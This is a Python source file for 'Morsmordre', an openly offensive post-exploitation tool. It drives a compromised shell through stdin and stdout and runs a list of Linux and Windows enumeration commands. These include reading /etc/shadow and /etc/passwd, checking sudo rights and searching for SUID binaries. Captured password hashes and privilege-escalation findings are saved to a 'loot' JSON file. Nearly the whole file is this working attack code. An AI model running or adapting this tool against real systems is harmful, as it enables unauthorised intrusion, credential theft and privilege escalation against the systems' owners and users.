#!/usr/bin/env python3
"""
Morsmordre v1.0 - Red Engine
Automated Post-Exploitation via stdin/stdout bridging
Reads commands from stdin, executes via shell, outputs to stdout
"""

import os
import sys
import json
import asyncio
import re
from datetime import datetime
from typing import List, Dict, Optional
from dataclasses import dataclass, asdict

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

@dataclass
class Loot:
    timestamp: str
    category: str
    data: str
    source: str

class Morsmordre:
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        self.target = os.getenv('MORSMORDRE_TARGET', 'unknown')
        self.os = os.getenv('MORSMORDRE_OS', 'Linux')
        self.lhost = os.getenv('MORSMORDRE_LHOST', '0.0.0.0')
        self.loot: List[Loot] = []
        self.commands_executed = 0
        self.reader = None
        self.writer = None
        
    def banner(self):
        if self.console:
            self.console.print(Panel.fit(
                "[bold red]Morsmordre v1.0 - Red Engine[/bold red]",
                subtitle="[red]Autonomous Enumeration Active[/red]",
                border_style="red"
            ))
        else:
            sys.stderr.write("\033[91m>>> Morsmordre v1.0 - The Finish Line <<<\033[0m\n")
    
    def log(self, msg: str, level: str = "info"):
        ts = datetime.now().strftime("%H:%M:%S")
        prefix = {"info": "[*]", "loot": "[LOOT]", "cmd": "[CMD]", 
                 "error": "[!]", "success": "[+]"}.get(level, "[*]")
        
        line = f"{prefix} [{ts}] {msg}\n"
        
        # Log to stderr so stdout stays clean for shell communication
        sys.stderr.write(line)
        sys.stderr.flush()
    
    def get_commands(self) -> List[Dict]:
        """OS-specific enumeration commands"""
        if "Windows" in self.os:
            return [
                {"cmd": "whoami", "type": "identity", "parser": "line"},
                {"cmd": "whoami /priv", "type": "privesc", "parser": "priv"},
                {"cmd": "systeminfo", "type": "system", "parser": "multi"},
                {"cmd": "net user", "type": "users", "parser": "multi"},
                {"cmd": "net localgroup administrators", "type": "users", "parser": "multi"},
                {"cmd": "ipconfig /all", "type": "network", "parser": "multi"},
                {"cmd": "tasklist /v", "type": "processes", "parser": "multi"},
            ]
        else:
            return [
                {"cmd": "id", "type": "identity", "parser": "line"},
                {"cmd": "whoami", "type": "identity", "parser": "line"},
                {"cmd": "uname -a", "type": "system", "parser": "line"},
                {"cmd": "cat /etc/passwd", "type": "credentials", "parser": "multi"},
                {"cmd": "cat /etc/shadow 2>/dev/null", "type": "credentials", "parser": "priv_check"},
                {"cmd": "sudo -l 2>/dev/null", "type": "privesc", "parser": "priv"},
                {"cmd": "find / -perm -4000 -type f 2>/dev/null", "type": "privesc", "parser": "suid"},
                {"cmd": "netstat -tulpn 2>/dev/null || netstat -tuln", "type": "network", "parser": "multi"},
                {"cmd": "ps aux", "type": "processes", "parser": "multi"},
                {"cmd": "cat /etc/crontab 2>/dev/null", "type": "persistence", "parser": "multi"},
                {"cmd": "ls -la /home", "type": "users", "parser": "multi"},
                {"cmd": "find /var/www -name '*.php' -o -name '*.config' 2>/dev/null | head -10", "type": "files", "parser": "multi"},
            ]
    
    async def send_command(self, cmd: str) -> str:
        """Send command to shell via stdout, read response from stdin"""
        self.log(f"Executing: {cmd}", "cmd")
        
        # Send command
        sys.stdout.write(f"{cmd}\n")
        sys.stdout.flush()
        
        # Read response (with timeout)
        response = ""
        try:
            # Read until we see a prompt or timeout
            loop = asyncio.get_event_loop()
            future = loop.run_in_executor(None, sys.stdin.readline)
            response = await asyncio.wait_for(future, timeout=10.0)
            
            # Read more lines if available
            while True:
                try:
                    line = await asyncio.wait_for(
                        loop.run_in_executor(None, sys.stdin.readline),
                        timeout=0.5
                    )
                    if line:
                        response += line
                    else:
                        break
                except asyncio.TimeoutError:
                    break
        except asyncio.TimeoutError:
            self.log("Command timeout", "warning")
        
        return response.strip()
    
    def analyze_output(self, cmd: str, output: str, cmd_type: str):
        """Analyze output for loot"""
        output_lower = output.lower()
        
        # Check for credentials
        if cmd_type == "credentials" and ("root:" in output or "administrator" in output_lower):
            if "shadow" in cmd and "permission denied" not in output_lower:
                self.log("ROOT HASHES CAPTURED!", "loot")
                self.loot.append(Loot(
                    timestamp=datetime.now().isoformat(),
                    category="credentials",
                    data=output[:1000],
                    source=cmd
                ))
            elif "passwd" in cmd:
                self.log("User list captured", "loot")
        
        # Check for privesc
        if cmd_type == "privesc":
            if "nopasswd" in output_lower or "(root)" in output:
                self.log("SUDO PRIVILEGE FOUND!", "loot")
                self.loot.append(Loot(
                    timestamp=datetime.now().isoformat(),
                    category="privesc",
                    data=output[:500],
                    source=cmd
                ))
            if "suid" in cmd and output.strip():
                lines = [l for l in output.split('\n') if l.strip() and not l.startswith('find')]
                if lines:
                    self.log(f"SUID binaries found: {len(lines)}", "loot")
        
        # Check for interesting processes
        if cmd_type == "processes" and any(x in output_lower for x in ['mysql', 'postgres', 'apache', 'nginx']):
            self.log("Interesting processes detected", "loot")
    
    async def run(self):
        """Main execution loop"""
        self.banner()
        self.log(f"Target: {self.target} | OS: {self.os}", "info")
        self.log("Starting autonomous enumeration...", "info")
        
        commands = self.get_commands()
        
        for idx, cmd_info in enumerate(commands):
            self.log(f"[{idx+1}/{len(commands)}] {cmd_info['cmd']}", "cmd")
            
            output = await self.send_command(cmd_info['cmd'])
            self.commands_executed += 1
            
            if output:
                self.analyze_output(cmd_info['cmd'], output, cmd_info['type'])
            
            # Small delay to not overwhelm
            await asyncio.sleep(0.5)
        
        self.log(f"Enumeration complete. Commands: {self.commands_executed}", "success")
        self.save_loot()
        
        # Signal completion
        sys.stdout.write("exit\n")
        sys.stdout.flush()
    
    def save_loot(self):
        """Save loot to file"""
        filename = f"morsmordre_{self.target.replace('.', '_')}_{datetime.now().strftime('%H%M%S')}.json"
        data = {
            "target": self.target,
            "os": self.os,
            "timestamp": datetime.now().isoformat(),
            "commands_executed": self.commands_executed,
            "loot": [asdict(l) for l in self.loot]
        }
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        self.log(f"Loot saved: {filename}", "loot")

async def main():
    morsmordre = Morsmordre()
    await morsmordre.run()

if __name__ == "__main__":
    asyncio.run(main())
